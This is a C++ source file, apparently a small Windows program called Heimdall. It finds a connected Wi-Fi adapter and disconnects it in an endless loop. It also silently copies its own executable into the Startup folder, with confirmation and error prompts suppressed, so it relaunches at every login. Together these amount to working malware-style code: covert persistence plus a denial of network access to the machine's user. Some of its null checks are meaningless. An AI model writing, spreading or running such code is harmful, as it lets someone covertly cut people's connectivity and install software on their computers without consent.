#include "Heimdall.h"

/* windows_heimdall function searches until a wifi adapter is connected to the 
network. After that, heimdall gets the guid of the adapter and disconnects it from the network .

Functions + Structs Documentation:
WlanEnumInterfaces : https://docs.microsoft.com/en-us/windows/win32/api/wlanapi/nf-wlanapi-wlanenuminterfaces
WlanOpenHandle : https://docs.microsoft.com/en-us/windows/win32/api/wlanapi/nf-wlanapi-wlanopenhandle
WlanDisconnect : https://docs.microsoft.com/en-us/windows/win32/api/wlanapi/nf-wlanapi-wlandisconnect

WLAN_INTERFACE_INFO_LIST : https://docs.microsoft.com/en-us/windows/win32/api/wlanapi/ns-wlanapi-wlan_interface_info_list
WLAN_INTERFACE_INFO : https://docs.microsoft.com/en-us/windows/win32/api/wlanapi/ns-wlanapi-wlan_interface_info

*/
void windows_heimdall() {
		DWORD  clientVer = 2; // version of the WLAN API
		DWORD dwCurVersion = 0; // The version of the WLAN API that will be used in this session
		DWORD dwResult = 0; // return value variable
		
		HANDLE handler = NULL; // A handle for the client to use in this session
		PWLAN_INTERFACE_INFO_LIST pIfList = NULL; // list with the wifi interfaces
		PWLAN_INTERFACE_INFO pIfInfo = NULL; // interface info

		const GUID* pguid = NULL; // guid pointer 

		dwResult = WlanOpenHandle(clientVer, NULL, &dwCurVersion, &handler);
		if (dwResult == ERROR_SUCCESS) { // if success 
			while (true) {
				DWORD res = WlanEnumInterfaces(handler, NULL, &pIfList); // take the wifi interfaces 
				for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
					pIfInfo = (WLAN_INTERFACE_INFO*)&pIfList->InterfaceInfo[i]; // interface info 
					if (pIfInfo->isState == wlan_interface_state_connected) { // if interface is connected 
						if (&pIfInfo->InterfaceGuid!=NULL) {
							//wprintf(L"  InterfaceGUID[%d]: %ws\n", i, GUID_str);
							pguid = &pIfInfo->InterfaceGuid; // guid to another variable 
							break;
						}
					}
				}
				if (&pIfInfo->InterfaceGuid != NULL)
					break;
				if (pIfList != NULL) { // free memory space
					WlanFreeMemory(pIfList);
					pIfList = NULL;
				}
			}
		}
		while (true) {
				if (pIfInfo->isState == wlan_interface_state_connected and pguid!=NULL) {
					DWORD disconnect = WlanDisconnect(handler, pguid, NULL);
					if (disconnect == ERROR_SUCCESS) {
						//std::cout << "Disconnected !!!!\n";
					}
				}
		}
}


bool FileExists(std::wstring fileName)
{
	DWORD fileAttr;

	fileAttr = GetFileAttributes((LPCSTR)fileName.c_str());
	if (0xFFFFFFFF == fileAttr)
		return false;
	return true;
}

void copyFileToStartUp()
{
	wchar_t Source[MAX_PATH] = { 0 };
	GetModuleFileNameW(0, Source, MAX_PATH);

	// get file name from path
	std::wstring wFileName;
	wFileName = PathFindFileNameW((LPCWSTR)Source);

	// get path to 'StartUp' folder
	PWSTR path;
	SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &path);

	// create destination path with file name
	std::wstring Dest(path);
	Dest = Dest + L"\\";
	Dest += wFileName;

	bool status = FileExists(Dest.c_str());

	if (status == FALSE)
	{
		SHFILEOPSTRUCTW fileOperation;
		memset(&fileOperation, 0, sizeof(SHFILEOPSTRUCTW));

		fileOperation.wFunc = FO_COPY;
		fileOperation.fFlags = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_FILESONLY;
		fileOperation.pFrom = (PCZZWSTR)Source;
		fileOperation.pTo = (PCZZWSTR)Dest.c_str();

		int result = SHFileOperationW(&fileOperation);
		if (result != 0)
		{
			printf("SHFileOperation Failure: Error%u\n", result);
		}

		memset(&fileOperation, 0, sizeof(SHFILEOPSTRUCTW));
	}
}


